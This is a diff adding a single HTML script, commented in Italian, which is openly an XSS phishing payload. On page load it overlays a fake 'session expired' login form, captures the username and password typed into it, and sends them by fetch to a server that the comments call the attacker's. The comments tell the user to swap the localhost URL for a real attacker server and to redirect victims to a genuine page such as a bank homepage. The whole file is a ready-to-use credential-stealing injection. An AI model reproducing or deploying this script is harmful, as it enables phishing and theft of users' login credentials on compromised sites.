@@ -1,0 +1,80 @@
+<script>
+    // 1. Definiamo una chiave unica per il localStorage.
+    //    Questa chiave verrà usata per tracciare se il pop-up è già apparso.
+    const POPUP_ALREADY_SHOWN_KEY = 'xss_phishing_popup_shown_once';
+
+    // 2. Controllo iniziale: Se il pop-up NON è ancora stato mostrato in questa sessione (o in precedenza)
+    if (localStorage.getItem(POPUP_ALREADY_SHOWN_KEY) !== 'true') {
+        // --- Inizio della logica di creazione e gestione del pop-up ---
+
+        // Crea l'overlay (lo sfondo oscurato)
+        var modalOverlay = document.createElement('div');
+        modalOverlay.id = 'xss-modal-overlay';
+        modalOverlay.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 9999; display: flex; justify-content: center; align-items: center;';
+
+        // Crea l'elemento div per il contenuto della modale (il pop-up vero e proprio)
+        var modalContent = document.createElement('div');
+        modalContent.id = 'xss-modal-content';
+        modalContent.style.cssText = 'background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); z-index: 10000; width: 350px; text-align: center; font-family: Arial, sans-serif;';
+
+        // Crea il form di phishing
+        var phishingForm = document.createElement('form');
+        phishingForm.innerHTML = `
+            <h3 style="color: #c00; margin-top: 0;">Attenzione: Sessione scaduta!</h3>
+            <p style="font-size: 0.9em; color: #555;">Per la tua sicurezza, riautenticati.</p>
+            <div style="text-align: left; margin-bottom: 10px;">
+                <label for="username_phish" style="display: block; margin-bottom: 5px; font-weight: bold;">Username:</label>
+                <input type="text" id="username_phish" name="username" style="width: calc(100% - 20px); padding: 10px; border: 1px solid #ddd; border-radius: 4px;" required>
+            </div>
+            <div style="text-align: left; margin-bottom: 20px;">
+                <label for="password_phish" style="display: block; margin-bottom: 5px; font-weight: bold;">Password:</label>
+                <input type="password" id="password_phish" name="password" style="width: calc(100% - 20px); padding: 10px; border: 1px solid #ddd; border-radius: 4px;" required>
+            </div>
+            <input type="submit" value="Accedi Ora" style="background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 1em;">
+        `;
+
+        // Aggiunge gli elementi al DOM
+        modalContent.appendChild(phishingForm);
+        modalOverlay.appendChild(modalContent);
+        document.body.appendChild(modalOverlay);
+        document.body.style.overflow = 'hidden'; // Blocca lo scroll della pagina
+
+        // 3. Listener per l'invio del form
+        phishingForm.addEventListener('submit', function(event) {
+            event.preventDefault(); // Impedisce il reindirizzamento del browser
+
+            // Raccoglie i dati inseriti dall'utente
+            const username = document.getElementById('username_phish').value;
+            const password = document.getElementById('password_phish').value;
+
+            // Invia i dati in background al server dell'attaccante tramite fetch
+            // ATTENZIONE: Assicurati che l'URL sia corretto per il tuo server attaccante!
+            // Es. 'http://[IP_DEL_TUO_SERVER_ATTACCANTE]:5000/log_credentials.php'
+            fetch('http://localhost:5000', { // <--- CAMBIA QUESTO URL AL TUO SERVER ATTACCANTE REALE
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+            })
+            .then(response => {
+                console.log('Credenziali inviate con successo!', response);
+            })
+            .catch(error => {
+                console.error('Errore nell\'invio delle credenziali:', error);
+            })
+            .finally(() => {
+                // 4. Imposta il flag nel localStorage PRIMA di chiudere il pop-up.
+                //    Questo assicura che il pop-up non riappaia nelle prossime visite.
+                localStorage.setItem(POPUP_ALREADY_SHOWN_KEY, 'true');
+
+                // Chiude il pop-up e riabilita lo scroll della pagina
+                modalOverlay.remove();
+                document.body.style.overflow = '';
+
+                // 5. Opzionale: Reindirizza l'utente a una pagina legittima
+                //    Sostituisci con l'URL vero della pagina a cui vuoi reindirizzare (es. homepage della banca)
+                // window.location.href = 'http://localhost/'; 
+            });
+        });
+        // --- Fine della logica di creazione e gestione del pop-up ---
+    }
+</script>
